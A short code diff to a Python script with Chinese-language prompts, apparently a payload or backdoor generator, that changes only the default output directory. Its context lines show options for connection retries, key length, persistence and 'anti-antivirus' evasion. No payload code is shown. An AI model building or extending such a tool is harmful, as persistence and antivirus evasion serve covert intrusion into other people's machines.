@@ -42,7 +42,7 @@ def interactive_mode():
         retry_count, retry_delay, key_length = 10, 5, 16
     
     # 输出选项
-    output_dir = input("输出目录 (默认: 当前目录) >>> ").strip() or "."
+    output_dir = input("输出目录 (默认: output) >>> ").strip() or "output"
     custom_filename = input("自定义文件名 (可选) >>> ").strip() or None
     
     add_persistence = input("添加持久化功能? (y/N) >>> ").strip().lower() == 'y'
@@ -166,7 +166,7 @@ def command_line_mode():
     parser.add_argument('-r', '--retry', default=10, type=int, help='连接重试次数')
     parser.add_argument('-d', '--delay', default=5, type=int, help='重试间隔')
     parser.add_argument('-k', '--key-length', default=16, type=int, help='密钥长度')
-    parser.add_argument('-o', '--output', default='.', help='输出目录')
+    parser.add_argument('-o', '--output', default='output', help='输出目录')
     parser.add_argument('-f', '--filename', help='自定义文件名')
     parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
     parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
